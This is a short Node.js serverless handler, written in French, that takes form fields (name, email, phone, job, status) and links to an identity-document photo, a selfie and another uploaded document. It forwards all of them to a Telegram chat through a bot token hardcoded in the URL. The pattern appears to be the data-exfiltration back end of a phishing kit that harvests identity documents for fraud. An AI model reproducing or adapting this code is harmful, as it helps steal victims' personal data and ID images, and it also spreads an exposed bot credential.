const fetch = require("node-fetch");

exports.handler = async (event) => {
  const data = JSON.parse(event.body);
  const { nom, prenom, email, telephone, emploi, statut, photo_identite, selfie, vip_upload } = data;

  const uploads = [];
  if (photo_identite) uploads.push(`📎 Photo d'identité: ${photo_identite}`);
  if (selfie) uploads.push(`📎 Selfie: ${selfie}`);
  if (vip_upload) uploads.push(`📎 Document: ${vip_upload}`);

  const message = `📩 Nouvelle soumission :\nNom: ${nom}\nPrénom: ${prenom}\nEmail: ${email}\nTéléphone: ${telephone}\nStatut: ${statut}\nEmploi: ${emploi}` +
    (uploads.length ? `\n\n🗂 Fichiers:\n` + uploads.join("\n") : "");

  const url = `https://api.telegram.org/bot7834024876:AAGtugP8egSaBaxCClBoRTixhVV_J8H-Dus/sendMessage`;

  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: "7383498608",
      text: message,
    })
  });

  return {
    statusCode: 200,
    body: JSON.stringify({ message: "Envoyé à Telegram avec fichiers!" })
  };
};
